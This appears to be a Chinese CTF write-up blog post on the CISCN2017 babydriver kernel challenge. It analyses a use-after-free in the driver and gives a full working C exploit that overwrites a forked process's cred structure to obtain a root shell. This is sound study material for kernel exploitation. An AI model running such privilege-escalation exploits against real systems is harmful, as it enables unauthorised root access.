---
layout: post
title:  "kernel题目1-CISCN2017-babydriver"
date:   2019-09-24 13:54:00
categories: pwn
tags: kernel
excerpt: CISCN2017-babydriver
mathjax: true
---

* content
{:toc}

### 0x00 逆向分析

#### 1. 解压镜像

压缩包中包含如下
`boot.sh  bzImage  rootfs.cpio`

```
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -monitor /dev/null -m 64M --nographic  -smp     cores=1,threads=1 -cpu kvm64,+smep
```

把 -enable-kvm 去掉之后正常启动起来了

解压rootfs.cpio

```
mkdir core
cd core
mv ../rootfs.cpio rootfs.cpio.gz
gunzip ./rootfs.cpio.gz
cpio -idmv < rootfs.cpio

```

init 脚本中发现
`insmod /lib/modules/4.4.72/babydriver.ko`

#### 2. 逆向驱动文件

1. 功能分析

* babyioctl 函数 : babyioctl(fd,command,arg) 判断command ==65537 时执行如下为device_buf 重新分配内存, kmalloc的size由arg控制

```
kfree(babydev_struct.device_buf);
babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL);
babydev_struct.device_buf_len = v4;
```

* babyrelease: 释放device_buf
* babyopen: 填充device_buf  size=64 
* babywrite: copy_from_user(babydev_struct.device_buf, buffer, v4);
* babyread: copy_to_user(buffer, babydev_struct.device_buf, v4);


2. 漏洞分析
babydev_struct是全局的，多次打开设备时，会覆盖babydev_struct。同理一个设备 free babydev_struct 过后，此时另一个设备依然可以向此处写入数据。因此造成UAF漏洞。

### 0x01 方法1 UAF利用cred
利用思路：
先打开两次设备/dev/babydev,得到两个文件描述符fd1和fd2
* fd1中申请堆块为0x8a,和cred结构一样大(查看源码或编译一个模块得到)
* 释放fd1，此时调用fork，新进程请求空间存放cred结构，正好得到了之前释放的空间，但UAF漏洞导致此时依然可以通过fd2往这段空间写值
* 使用fd2 写入足够多的0 将uid，gid都设置为0即可

cred结构定义在cred.h中 
kuid_t,kgid_t 可以查到都是4个字节

```
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};
```

编写exp如下
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

void main(){
    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x8a);
    close(fd1);
    int pid = fork();
    if(pid<0){
        printf("fork error");
        exit(0);
    }
    else if(pid==0){
        char zeros[30] = {0};
        write(fd2,zeros,28);
        if(getuid() ==0){
            puts("[+] get root");
            system("/bin/sh");
            exit(0);
        }
    }
    else
    {
        wait(NULL);
    }
    close(fd2);
    return 0;
}
```

刚开始编写程序时一定不要忘记写全头文件，尽量不出现函数未定义的情况，否则会导致程序调用到不一样的函数

编译程序
`gcc exp.c -o exp -static`
重打包为文件镜像
`find . | cpio -o --format=newc > ../rootfs.img`


接着让我们调试看看为什么会拿到shell,关注的点在于write操作写入到了哪里,cred 结构又覆盖了哪些


fd1申请0x8a之后
q
write前后对比

运行结果如下


编译模块获取cred结构大小
还有一个问题是如何知道cred的大小，一种方法是看源码，这种方法比较慢，还容易出错。另一种方法是编译一个内核模块来查看：

```
#include <linux/init.h>
#include <linux/module.h>
#include <linux/cred.h>

MODULE_LICENSE("Dual BSD/GPL");

static int hello_init(void)
{
    printk(KERN_ALERT "sizeof cred: %d", sizeof(struct cred));
    return 0;
}

static void hello_exit(void)
{
    printk(KERN_ALERT "exit module!");
}

module_init(hello_init);
module_exit(hello_exit);
```

Makefile：

```
obj-m := cred_size.o
KERNELBUILD := /lib/modules/$(shell uname -r)/build

modules:
    make -C $(KERNELBUILD) M=$(CURDIR) modules
clean:
    make -C $(KERNELBUILD) M=$(CURDIR) clean
```


### 方法2：使用tty 结构


### 参考链接

http://pwn4.fun/2017/08/15/Linux-Kernel-UAF/
https://www.anquanke.com/post/id/86490

kernel ROP
https://www.cnblogs.com/Joe-Z/p/5651812.html
